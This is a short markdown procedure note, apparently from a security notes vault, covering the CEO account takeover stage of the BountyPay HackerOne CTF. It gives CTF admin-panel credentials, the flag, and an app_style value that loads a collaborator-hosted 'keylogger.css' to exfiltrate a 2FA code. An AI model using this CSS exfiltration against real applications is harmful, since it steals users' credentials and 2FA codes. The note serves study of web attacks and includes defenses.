---
tags:
  - information-disclosure
  - 2fa-bypass
  - css-exfiltration
  - ssrf
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Custom-PHP-Exfiltration-Scripts]]'
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:58.223Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: a22210ad-615c-44f8-aa24-f21433a3dce0
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
  - '[[Exploit Public-Facing Application]]'
---
# CEO-Takeover-and-Final-2FA-Bypass

## Summary

This procedure accesses the admin panel to retrieve CEO credentials, logs in as CEO to trigger 2FA, and bypasses it using SSRF in app_style for CSS-based exfiltration of the code.

## Description

Admin panel at /admin exposes CEO creds marten.mickos / m1ck0sBountyP@y. CEO login triggers 7-char 2FA. app_style param accepts external CSS URLs, allowing attribute selectors to exfil to collaborator server. Custom PHP scripts detect input names/values; Burp Intruder brutes last char.

## Requirements

1. Admin access
2. Collaborator server for exfiltration
3. Custom PHP scripts (input-finder.php, value-finder.php)

## Defense

- Never expose credentials in admin interfaces
- Validate and restrict CSS URLs to trusted domains
- Use time-based or app-based 2FA without exfiltratable forms

## Objectives

1. Obtain CEO credentials
2. Initiate and exfiltrate 2FA code
3. Achieve full takeover

## Instructions

### Step 1: Access Admin Panel

**Context**: View user list in admin.

Navigate to https://staff.bountypay.h1ctf.com/admin.

> Reveals CEO creds.

### Step 2: CEO Login and 2FA Trigger

**Context**: Login and attempt approval.

Login at customer dashboard with CEO creds; try payment approval.

> Triggers 2FA form.

### Step 3: CSS Exfiltration

**Context**: SSRF app_style to collaborator CSS keylogger.

Set app_style=https://collaborator.burpcollaborator.net/keylogger.css. Use input-finder.php to detect field names, value-finder.php for values. Brute last char with Burp Intruder.

> Exfiltrates code h1ctf{736c635d8842751b8aafa556154eb9f3}.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Unsecured Credentials]] Unsecured Credentials
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

None

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/Custom-PHP-Exfiltration-Scripts]]

## Tags

- [[information-disclosure]]
- [[2fa-bypass]]
- [[css-exfiltration]]
- [[ssrf]]
